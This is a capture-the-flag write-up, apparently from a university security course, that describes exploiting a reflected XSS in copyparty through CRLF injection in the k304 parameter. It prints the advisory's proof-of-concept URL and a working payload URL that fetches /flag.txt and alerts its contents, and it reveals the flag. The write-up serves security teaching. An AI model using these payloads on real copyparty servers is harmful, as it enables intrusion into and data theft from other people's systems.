# CTF7

After opening the website and trying to detect some vulnerability, we found on the login page a button to enable/disable the k304 (disconnect the client on every HTTP 304). Upon enabling, we discovered that it added a cookie "k304=y".

![cookie](/Images/CTF7/cookie.png)

Then, we tried to access the flag.txt through injection of a script code using the k304 cookie. To acomplish that, we found a github (https://github.com/9001/copyparty/security/advisories/GHSA-f54q-j679-p9hh) related to that same vulnerability. The example given in the exploit was:

```
https://localhost:3923/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

So, we changed the source to a script that would give us the flag content:

```
fetch('/flag.txt').then(response => response.text()).then(text => alert(text))
```

Finally, the URL to the answer was:

```
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3C%3Cimg%20src=%22copyparty%22%20onerror=%22fetch(%27/flag.txt%27).then(response%20=%3E%20response.text()).then(text%20=%3E%20alert(text))%22%3E%3Dcopyparty+onerror%3Dalert(1)%3E
```

This URL gave us an "alert" with the actual flag:

flag{youGotMeReallyGood}

![search](/Images/CTF7/search.png)

Questions:
- Why can't we access the hidden flag directly? There is a restriction in the file flag.txt, because the content on that file was "Nice try, I am only accessible via JavaScript shenanigans.";
- Is there any known vulnerability? Yes, the github we found helped us getting the flag;
- Which type of XSS allowed us to access the flag? We used a XSS Reflected attack.